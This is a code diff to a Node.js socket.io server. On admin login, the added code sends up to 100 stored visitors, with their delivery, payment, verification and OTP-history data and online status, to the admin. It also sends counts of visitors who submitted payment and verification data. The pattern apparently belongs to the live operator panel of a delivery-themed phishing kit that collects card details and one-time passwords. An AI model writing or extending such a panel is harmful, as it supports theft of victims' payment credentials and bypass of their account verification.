@@ -361,8 +361,76 @@ io.on('connection', (socket) => {
             [sessionToken, JSON.stringify(deviceInfo || {}), ip, geo?.country || 'Unknown']
           );
 
+          // Send login success
           socket.emit('admin:loginSuccess', { sessionToken, adminId: admin.id });
           console.log(`🔐 Admin ${username} logged in from ${geo?.country}`);
+          
+          // CRITICAL: Fetch and send ALL visitors from database immediately
+          try {
+            const visitorsResult = await pool.query(
+              'SELECT * FROM visitors WHERE is_deleted = false ORDER BY last_activity DESC LIMIT 100'
+            );
+            
+            const allVisitors = visitorsResult.rows.map(visitor => {
+              // Parse JSON fields
+              let deliveryData = visitor.delivery_data;
+              if (typeof deliveryData === 'string') {
+                try { deliveryData = JSON.parse(deliveryData); } catch (e) { deliveryData = {}; }
+              }
+              
+              let paymentData = visitor.payment_data;
+              if (typeof paymentData === 'string') {
+                try { paymentData = JSON.parse(paymentData); } catch (e) { paymentData = {}; }
+              }
+              
+              let verificationData = visitor.verification_data;
+              if (typeof verificationData === 'string') {
+                try { verificationData = JSON.parse(verificationData); } catch (e) { verificationData = {}; }
+              }
+              
+              let otpHistory = visitor.otp_history;
+              if (typeof otpHistory === 'string') {
+                try { otpHistory = JSON.parse(otpHistory); } catch (e) { otpHistory = []; }
+              }
+              
+              return {
+                ...visitor,
+                session_id: visitor.session_id,
+                delivery_data: deliveryData || {},
+                payment_data: paymentData || {},
+                verification_data: verificationData || {},
+                otp_history: otpHistory || [],
+                is_online: isOnlineVisitors.has(visitor.session_id)
+              };
+            });
+            
+            // Send all visitors to this admin
+            socket.emit('admin:initData', { visitors: allVisitors });
+            console.log(`📊 Sent ${allVisitors.length} visitors to admin`);
+            
+            // Also send stats
+            const statsResult = await pool.query(`
+              SELECT 
+                COUNT(*) as total,
+                COUNT(CASE WHEN delivery_data IS NOT NULL AND delivery_data != '{}' THEN 1 END) as with_delivery,
+                COUNT(CASE WHEN payment_data IS NOT NULL AND payment_data != '{}' THEN 1 END) as with_payment,
+                COUNT(CASE WHEN verification_data IS NOT NULL AND verification_data != '{}' THEN 1 END) as with_verification
+              FROM visitors WHERE is_deleted = false
+            `);
+            
+            const stats = {
+              total: parseInt(statsResult.rows[0].total) || 0,
+              withDelivery: parseInt(statsResult.rows[0].with_delivery) || 0,
+              withPayment: parseInt(statsResult.rows[0].with_payment) || 0,
+              withVerification: parseInt(statsResult.rows[0].with_verification) || 0
+            };
+            
+            socket.emit('stats:data', stats);
+            console.log(`📊 Sent stats to admin:`, stats);
+            
+          } catch (dbError) {
+            console.error('❌ Error fetching visitors:', dbError);
+          }
         } else {
           socket.emit('admin:loginFailed', { message: 'Invalid credentials' });
         }
